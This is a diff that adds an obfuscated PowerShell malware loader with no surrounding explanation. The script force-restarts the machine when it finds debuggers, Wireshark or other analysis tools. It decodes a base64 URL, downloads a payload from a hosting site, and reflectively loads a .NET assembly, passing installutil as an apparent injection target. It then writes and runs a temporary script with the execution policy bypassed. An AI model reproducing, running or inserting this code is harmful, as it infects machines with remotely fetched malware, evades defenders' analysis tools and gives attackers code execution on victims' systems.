@@ -1,0 +1,18 @@
+Start-Sleep -Seconds 5; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
+;$result = Test-Connection 'www.google.com' -ErrorAction SilentlyContinue;
+$pingSuccessful = $result -is [Array];
+if ($pingSuccessful){
+
+}
+else{
+Restart-Computer -force ;
+      exit;
+};
+
+;if((get-process 'python', 'python3.13','tcpview', 'OLLYDBG','ImmunityDebugger', 'Wireshark','apateDNS','analyze' -ea SilentlyContinue) -eq $Null){ 
+       
+}
+else{ 
+Restart-Computer -force ;
+      exit;
+ };[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 ;$Stringbase;Function BaseMy{;$Zhtfq = [System.Text.Encoding]::UTF8.GetString([system.Convert]::FromBase64String($Stringbase));return $Zhtfq;};$gFJvC = ( [System.IO.Path]::GetTempPath() + 'lmqvf.txt' );$qWYQI = 'aHR0cHM6Ly9zbm93LWZpc2gtNDI1OTA0Lmhvc3RpbmdlcnNpdGUuY29tL1VwY3J5cHRlci8wMS9NZXVzQXJxdWl2b3MwMS50eHQ=';$Stringbase = $qWYQI; $qWYQI = BaseMy;$qWYQI | Out-File -FilePath $gFJvC -Encoding 'UTF8' -force ;$JmpeA = ( [System.IO.Path]::GetTempPath() + 'dbjhl.txt' ) ;$vtgmp = New-Object System.Net.WebClient ;$vtgmp.Encoding = [System.Text.Encoding]::UTF8 ;$zGWuq  = ( Get-Content -Path $gFJvC ) ;$jllni = $vtgmp.DownloadData( $zGWuq ) ;$kqmlh = [System.Text.Encoding]::UTF8.GetString($jllni);$kqmlh = @([regex]::split($kqmlh,'\%x%+'))[1];$kqmlh | Out-File -FilePath $JmpeA -force ;$jHQSW = 'Load';$KFcId = 'Invoke';$yJiEK = 'Domain';$zlzzn = '$TMgRv = ''%base64%L3dhci9kZGJ4YmcvdGVuLnlyZXRzYXAud3d3Ly86c3B0dGg='' ;$dqGlY = ( [System.IO.Path]::GetTempPath() + ''dbjhl.txt'' ) ; $ycYlM = (Get-Content -Path $dqGlY -Encoding UTF8);' ;$zlzzn += '$ajwmH = $ycYlM.replace(''↓:↓'',''A'');' ;$zlzzn += '[Byte[]] $Zhtfq = [system.Convert]::FromBase64String( $ajwmH ) ;' ;$zlzzn += '[System.App' + $yJiEK + ']:' + ':Current' + $yJiEK + '.' + $jHQSW + '( $Zhtfq ).' ;$zlzzn += 'GetType( ''ClassLibrary3.Class1'' ).GetM' ;$zlzzn += 'ethod( ''prFVI'' ).' + $KFcId + '( $null , [object[]] ( $TMgRv , ''%FLCGo%'' , ''D D1Dc:\windows\microsoft.net\framework\v4.0.30319\installutil'' ) );' ;$hrlny = ( [System.IO.Path]::GetTempPath() + 'pnzjn.ps1' ) ;$zlzzn | Out-File -FilePath $hrlny  -force ;powershell -ExecutionPolicy Bypass -File $hrlny ;
